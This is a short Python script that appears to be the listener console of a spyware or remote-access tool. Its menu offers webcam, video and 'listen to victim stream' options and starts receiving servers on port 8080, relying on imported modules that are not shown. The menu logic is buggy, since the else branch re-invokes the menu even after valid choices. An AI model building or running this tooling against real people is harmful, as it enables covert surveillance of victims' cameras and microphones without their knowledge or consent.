from bruh2 import start_server
from bruh1 import start_streaming_server
from bruh import receive_audio_from_client


def Main():
    banner = """"
    listener:
    
    1)webcam stream
    2)video stream
    3)listen to victim stream

    """
    print(banner)
    choice = input("choice: ")
    
    if choice == "1":
       start_streaming_server(server_ip='0.0.0.0', server_port=8080)
    if choice == "2":
       start_server('0.0.0.0', 8080)
    if choice == "3":
        receive_audio_from_client()
    else:
        Main()

Main()
